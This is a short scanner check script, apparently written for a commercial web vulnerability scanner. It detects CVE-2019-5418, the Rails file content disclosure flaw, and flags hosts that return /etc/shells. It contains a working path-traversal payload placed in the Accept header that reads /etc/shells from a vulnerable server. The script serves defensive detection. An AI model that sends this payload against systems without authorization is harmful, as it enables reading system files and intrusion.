/**
title: Rails File Content Disclosure
tags: rails
author: bogdan
description:
    Tests for CVE-2019-5418 - File Content Disclosure on Rails. 
**/

/// <reference path="../native.d.ts"/>

let flow = ax.loadModule("/lib/utility/flow.js").flow(scanState);
let pt = ax.loadModule("/lib/utility/path_traversal.js");

// debugging
function trace(msg) {
    //    ax.log(1, "LOG:" + msg);
}

// alert the vulnerability
function alert() {
    scanState.addVuln({
        typeId: "rails_accept_file_content_disclosure.xml",
        location: scriptArg.location,
        http: scriptArg.http
    });
}

// test vulnerability 
function testVulnerability() {
    //trace("testing on URI: " + scriptArg.http.request.uri);

    // prepare job from the current request scriptArg.http.request
    let job = ax.http.job();
    job.setUrl(scriptArg.target.url);
    job.request.assign(scriptArg.http.request);

    // the exploit
    if (job.request.headers.has("Accept"))
        job.request.setHeader("Accept", "../../../../../../../../etc/shells{{");
    else job.request.addHeader("Accept", "../../../../../../../../etc/shells{{");

    // make http request
    let http = ax.http.execute(job).sync();

    if (!http.error
        && pt.isEtcShells(http.response.body)) {
        return true;
    }

    return false;
}

// main function
function main() {
    // look for rails responses (certain headers are present in these response)
    // we cannot test on one endpoint (only calls to "render" which render file contents without a specified accept format are vulnerable)
    // we need to test all endpoints with specific characteristics
    if (
        !scriptArg.location.isFolder // test only files, not folders
        && scriptArg.http.request.method == "GET" // only GET
        && scriptArg.http.request.uri.indexOf("?") == -1 // no params
        && scriptArg.http.response.isType("text/html") // text/html
        && scriptArg.http.response.headers.has("X-Runtime") // X-Runtime
        && scriptArg.http.response.headers.has("X-Request-Id") // X-Request-Id
    ) {

        // test the vulnerability
        let vulnerable = testVulnerability();

        // alert only one time per scan        
        if (vulnerable) {
            flow.callIdOnce("rails-accept-lfi-" + scriptArg.location.url.host, alert);
        }
    }
}

main();
